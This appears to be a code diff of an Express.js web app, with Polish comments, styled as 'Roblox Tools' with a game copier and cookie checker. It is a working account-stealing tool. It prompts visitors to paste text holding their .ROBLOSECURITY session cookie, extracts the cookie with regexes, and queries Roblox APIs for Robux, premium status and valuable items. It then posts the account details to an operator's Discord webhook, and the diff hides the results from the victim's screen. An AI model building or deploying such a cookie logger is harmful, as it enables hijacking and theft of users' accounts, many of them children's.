@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – tylko przycisk i minimalny design
+// Strona główna – prosty przycisk
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -25,39 +25,39 @@ app.get('/', (req, res) => {
       justify-content: center;
     }
     .card {
-      background: rgba(26, 26, 46, 0.8);
+      background: rgba(26, 26, 46, 0.85);
       border: 1px solid #334;
       border-radius: 16px;
-      padding: 60px 80px;
+      padding: 70px 90px;
       text-align: center;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+      box-shadow: 0 12px 50px rgba(0,0,0,0.7);
     }
     h1 {
       color: #6ab0ff;
-      margin-bottom: 40px;
-      font-size: 2.8rem;
+      margin-bottom: 50px;
+      font-size: 3rem;
     }
     .btn {
       background: #3b82f6;
       color: white;
-      padding: 18px 70px;
-      font-size: 1.5rem;
-      border-radius: 10px;
+      padding: 20px 80px;
+      font-size: 1.7rem;
+      border-radius: 12px;
       text-decoration: none;
-      transition: all 0.25s;
+      transition: all 0.3s;
       display: inline-block;
     }
     .btn:hover {
       background: #2563eb;
-      transform: translateY(-3px);
-      box-shadow: 0 10px 25px rgba(59,130,246,0.5);
+      transform: translateY(-4px);
+      box-shadow: 0 12px 30px rgba(59,130,246,0.6);
     }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Roblox Tools</h1>
-    <a href="/game-copier" class="btn">Game Copier & Cookie Checker</a>
+    <a href="/game-copier" class="btn">Game Copier & Checker</a>
   </div>
 </body>
 </html>
@@ -65,108 +65,171 @@ app.get('/', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// Pełna, oryginalna strona z checkerem cookie – teraz na /game-copier
+// Strona checker – TYLKO input + przycisk, zero wyników na ekranie
 // ────────────────────────────────────────────────
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Cookie Extractor & Checker</title>
+  <title>Roblox Cookie Checker</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 20px; }
-    .container { max-width: 780px; margin: 0 auto; }
-    h1 { color: #6ab0ff; text-align: center; }
+    body { 
+      font-family: Arial, sans-serif; 
+      background: #0f0f17; 
+      color: #e0e0ff; 
+      margin: 0; 
+      padding: 24px; 
+    }
+    .container { 
+      max-width: 820px; 
+      margin: 0 auto; 
+    }
+    h1 { 
+      color: #6ab0ff; 
+      text-align: center; 
+      margin-bottom: 12px;
+    }
     .back { 
       display: inline-block; 
-      margin: 0 0 20px 0; 
+      margin-bottom: 28px; 
       color: #60a5fa; 
       text-decoration: none; 
       font-weight: bold; 
-      font-size: 1.1rem;
+      font-size: 1.15rem;
     }
     .back:hover { color: #93c5fd; }
-    textarea { width: 100%; min-height: 220px; background: #1a1a2e; color: #d0d0ff; border: 1px solid #334; border-radius: 8px; padding: 14px; font-family: Consolas, monospace; font-size: 14px; resize: vertical; margin: 16px 0; }
-    button { background: #3b82f6; color: white; border: none; padding: 14px 36px; font-size: 16px; border-radius: 6px; cursor: pointer; display: block; margin: 0 auto 24px; }
+    textarea { 
+      width: 100%; 
+      min-height: 280px; 
+      background: #1a1a2e; 
+      color: #d0d0ff; 
+      border: 1px solid #3a3a5c; 
+      border-radius: 10px; 
+      padding: 18px; 
+      font-family: Consolas, 'Courier New', monospace; 
+      font-size: 15px; 
+      resize: vertical; 
+      margin: 16px 0 24px 0; 
+    }
+    button { 
+      background: #3b82f6; 
+      color: white; 
+      border: none; 
+      padding: 18px 60px; 
+      font-size: 1.2rem; 
+      border-radius: 10px; 
+      cursor: pointer; 
+      display: block; 
+      margin: 0 auto 30px; 
+      font-weight: 600;
+    }
     button:hover { background: #2563eb; }
-    #result { background: #1a1a2e; border: 1px solid #334; border-radius: 8px; padding: 20px; min-height: 180px; white-space: pre-wrap; word-break: break-all; }
-    .error { color: #ff6b6b; font-weight: bold; }
+    button:disabled {
+      background: #1e40af;
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+    #result { 
+      background: #1a1a2e; 
+      border: 1px solid #3a3a5c; 
+      border-radius: 10px; 
+      padding: 28px; 
+      min-height: 100px; 
+      text-align: center; 
+      font-size: 1.15rem;
+      line-height: 1.6;
+    }
+    .error   { color: #ff6b6b; font-weight: bold; }
     .success { color: #4ade80; font-weight: bold; }
     .loading { color: #fbbf24; font-style: italic; }
-    img#avatar { max-width: 160px; border-radius: 10px; border: 2px solid #334; margin: 12px 0; display: block; }
   </style>
 </head>
 <body>
 <div class="container">
-  <a href="/" class="back">← Powrót do strony głównej</a>
-  <h1>Roblox Cookie Checker (auto extraction)</h1>
-  <p>Paste any text (PowerShell, console, headers, JSON etc.)<br>Cookie will be extracted automatically</p>
-  <textarea id="input" placeholder="Paste your text here..."></textarea>
-  <button onclick="check()">Check & Send to Webhook</button>
+  <a href="/" class="back">← Strona główna</a>
+  <h1>Roblox Cookie Checker</h1>
+  <p>Wklej tekst zawierający .ROBLOSECURITY (logi, konsola, headers, JSON itp.)<br>
+     Dane konta pojawią się **tylko** w Twoim webhooku.</p>
+  
+  <textarea id="input" placeholder="Wklej tutaj..."></textarea>
+  
+  <button id="checkBtn" onclick="check()">Check & Send to Webhook</button>
+  
   <div id="result"></div>
 </div>
+
 <script>
 async function check() {
+  const btn = document.getElementById('checkBtn');
   const raw = document.getElementById('input').value.trim();
   const result = document.getElementById('result');
+
   result.innerHTML = '';
+  btn.disabled = true;
+
   if (!raw) {
-    result.innerHTML = '<span class="error">Nothing pasted</span>';
+    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
+    btn.disabled = false;
     return;
   }
+
   let cookie = null;
   let match;
+
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
+
   if (!cookie) {
     match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
     if (match && match[1]) cookie = match[1].trim();
   }
+
   if (!cookie) {
     match = raw.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
+
   if (!cookie) {
     const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
-    if (fallback.length) cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
+    if (fallback.length) {
+      cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
+    }
   }
+
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    result.innerHTML = '<span class="error">No valid .ROBLOSECURITY found in text</span>';
+    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
+    btn.disabled = false;
     return;
   }
-  result.innerHTML = '<span class="loading">Cookie found – checking and sending to webhook...</span>';
+
+  result.innerHTML = '<span class="loading">Trwa sprawdzanie i wysyłanie do webhooka...</span>';
+
   try {
     const res = await fetch('/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie })
     });
-    if (!res.ok) throw new Error('Server error: ' + res.status);
-    const json = await res.json();
-    if (json.error) {
-      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
-      return;
+
+    if (!res.ok) {
+      throw new Error('Błąd serwera: ' + res.status);
     }
-    let html = \`<span class="success">Account checked and sent to webhook!</span><br><br>\`;
-    if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
-    html += \`
-      <b>Username:</b> \${json.username || '?'}<br>
-      <b>User ID:</b> \${json.userId || '?'}<br>
-      <b>Premium:</b> \${json.hasPremium ? 'True' : 'False'}<br>
-      <b>Email Verified:</b> \${json.emailVerified ? 'True' : 'False'}<br>
-      <b>Robux:</b> \${json.robux?.toLocaleString('en-US') || 0}<br>
-      <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
-      <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
-      <b>MM2:</b> \${json.mm2Count || 0}<br>
-      <b>AMP:</b> \${json.ampCount || 0}<br>
-      <b>SAB:</b> \${json.sabCount || 0}<br>
-      <b>JB:</b> \${json.jbCount || 0}<br>
-    \`;
-    result.innerHTML = html;
+
+    const json = await res.json();
+
+    if (json.error) {
+      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
+    } else {
+      result.innerHTML = '<span class="success">Gotowe – cookie sprawdzone i wysłane do webhooka ✓</span>';
+    }
+
   } catch (err) {
-    result.innerHTML = \`<span class="error">Error: \${err.message}</span>\`;
+    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
+  } finally {
+    btn.disabled = false;
   }
 }
 </script>
@@ -176,15 +239,16 @@ async function check() {
 });
 
 // ────────────────────────────────────────────────
-// Endpoint sprawdzający cookie – bez zmian
+// Endpoint /check – bez zmian (wszystkie dane idą do webhooka)
 // ────────────────────────────────────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
     return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
+
   try {
-    // Get CSRF Token
+    // Pobranie X-CSRF-Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -195,7 +259,7 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Get authenticated user data
+    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -206,7 +270,7 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Email Verified (via Verified Email Badge)
+    // Verified email (przez badge)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -218,7 +282,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Premium status
+    // Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -227,7 +291,7 @@ app.post('/check', async (req, res) => {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
-    // Current Robux balance
+    // Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -251,7 +315,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Groups owned (rank 255)
+    // Grupy (owner = rank 255)
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -263,7 +327,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Account age
+    // Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -287,7 +351,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Gamepasses
+    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -298,7 +362,13 @@ app.post('/check', async (req, res) => {
       for (const passId of allIds) {
         const gpRes = await fetch(
           `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
-          { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' } }
+          {
+            headers: {
+              'Cookie': `.ROBLOSECURITY=${cookie}`,
+              'X-CSRF-TOKEN': csrfToken,
+              'Accept': 'application/json',
+            },
+          }
         );
         if (gpRes.ok) {
           const gpData = await gpRes.json();
@@ -356,7 +426,7 @@ app.post('/check', async (req, res) => {
       jbCount
     };
 
-    // Webhook
+    // Wysyłka do Discord webhooka
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -369,14 +439,43 @@ app.post('/check', async (req, res) => {
                 color: 0x0F0F23,
                 title: `<:User:1481761037257674872> ${userData.name}`,
                 description: "**AVATAR**",
-                thumbnail: { url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png" },
+                thumbnail: {
+                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
+                },
                 fields: [
-                  { name: "┌─────── Account Stats ───────┐", value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`, inline: false },
-                  { name: "**Info**", value: `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`, inline: true },
-                  { name: "**Games**", value: `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n<:AMP:1481763635775930520> AMP: **${ampCount}**\n<:SAB:1481763931113394177> SAB: **${sabCount}**\n<:JB:1481804052215103509> JB: **${jbCount}**`, inline: true },
-                  { name: "**Inventory**", value: `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`, inline: true }
+                  {
+                    name: "┌─────── Account Stats ───────┐",
+                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
+                    inline: false
+                  },
+                  {
+                    name: "**Info**",
+                    value:
+                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
+                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
+                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
+                    inline: true
+                  },
+                  {
+                    name: "**Games**",
+                    value:
+                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
+                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
+                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
+                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
+                    inline: true
+                  },
+                  {
+                    name: "**Inventory**",
+                    value:
+                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
+                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
+                    inline: true
+                  }
                 ],
-                footer: { text: "24H! • " + new Date().toLocaleString('en-US') },
+                footer: {
+                  text: "24H! • " + new Date().toLocaleString('en-US')
+                },
                 timestamp: new Date().toISOString()
               },
               {
@@ -389,7 +488,7 @@ app.post('/check', async (req, res) => {
           })
         });
       } catch (e) {
-        console.error("Webhook error:", e.message);
+        console.error("Webhook send error:", e.message);
       }
     }
 
